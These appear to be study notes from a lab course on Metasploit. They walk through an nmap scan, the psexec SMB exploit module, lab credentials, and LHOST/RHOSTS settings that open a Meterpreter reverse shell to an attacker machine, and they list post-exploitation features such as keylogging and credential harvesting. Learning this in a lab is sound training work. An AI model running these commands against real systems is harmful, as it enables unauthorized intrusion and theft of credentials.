# Automating Payloads & Delivery with Metasploit

## Overview

Metasploit is a popular penetration testing framework developed by Rapid7 that automates:
- Exploitation
- Payload delivery
- Enumeration
- Post-exploitation tasks

It contains hundreds of:
- Exploit modules
- Payloads
- Scanners
- Auxiliary tools

Metasploit simplifies attacking vulnerable systems by providing ready-made modules with configurable options.

# Important Metasploit Module Types

| Module Type | Purpose |
|-------------|----------|
| Exploit | Exploit vulnerabilities |
| Payload | Execute commands/shells |
| Auxiliary | Scanning and enumeration |
| Post | Post-exploitation actions |
| Encoder | Obfuscate payloads |
| NOP | Generate no-operation instructions |

---

# Enumeration Before Exploitation

Before selecting an exploit:
- Identify the operating system
- Identify open ports and services
- Determine possible attack vectors

---

# Nmap Scan Example

## Main Command

```bash
nmap -sC -sV -Pn 10.129.164.25
```

---

# Important SMB Port

Example:

```text
445/tcp open microsoft-ds
```

Port `445` commonly indicates:
- SMB service
- Windows file sharing

This helps identify:
- Potential Windows target
- SMB-related attack surface

# Understanding Module Structure

| Part | Meaning |
|------|----------|
| `exploit` | Module category |
| `windows` | Target operating system |
| `smb` | Target service |
| `psexec` | Exploitation method |

---

# Selecting the Module

## Main Command

```bash
use exploit/windows/smb/psexec
```

or using module number:

```bash
use 56
```

---

# Default Payload

When selecting the module, Metasploit automatically chooses a payload.

Example:

```text
windows/meterpreter/reverse_tcp
```

This means:
- Meterpreter shell
- Reverse TCP connection back to attacker

---

# Meterpreter Overview

Meterpreter is an advanced payload that:
- Executes in memory
- Uses DLL injection
- Avoids touching disk when possible

Provides advanced features such as:
- File upload/download
- Command execution
- Process management
- Privilege escalation support
- Keylogging
- Webcam/microphone interaction (where supported)

# Important Exploit Settings

| Setting | Purpose |
|---------|----------|
| `RHOSTS` | Target IP address |
| `RPORT` | Target service port |
| `SMBUser` | SMB username |
| `SMBPass` | SMB password |
| `SHARE` | SMB share used |
| `LHOST` | Attacker IP |
| `LPORT` | Listener port |

---

# Configure the Exploit

## Main Commands

```bash
set RHOSTS 10.129.180.71
set SHARE ADMIN$
set SMBUser htb-student
set SMBPass HTB_@cademy_stdnt!
set LHOST 10.10.14.222
```

---

# Configuration Explanation

| Option | Explanation |
|--------|-------------|
| `RHOSTS` | Windows target |
| `ADMIN$` | Administrative SMB share |
| `SMBUser/SMBPass` | Credentials used for authentication |
| `LHOST` | Attacker machine receiving reverse shell |

# Why Meterpreter Is Powerful

Meterpreter allows:
- In-memory execution
- Stealthier operations
- File system interaction
- Process migration
- Persistence techniques
- Credential harvesting

It is far more capable than:
- Basic Netcat shells
- Raw TCP shells

---

# Important Notes

- Many Metasploit modules require valid credentials
- SMB exploitation commonly targets Windows systems
- Incorrect payload settings cause exploit failure
- AV/EDR solutions may detect Meterpreter
- Enumeration is critical before exploitation

---

# Key Points

- Metasploit automates exploitation workflows
- Nmap helps identify attack vectors
- SMB commonly uses port `445`
- `psexec` module uses SMB authentication
- Meterpreter provides advanced post-exploitation capabilities

# One-Line Revision

Metasploit automates exploitation and payload delivery using modules like `psexec` and advanced payloads such as Meterpreter to gain and manage shell access on vulnerable systems.
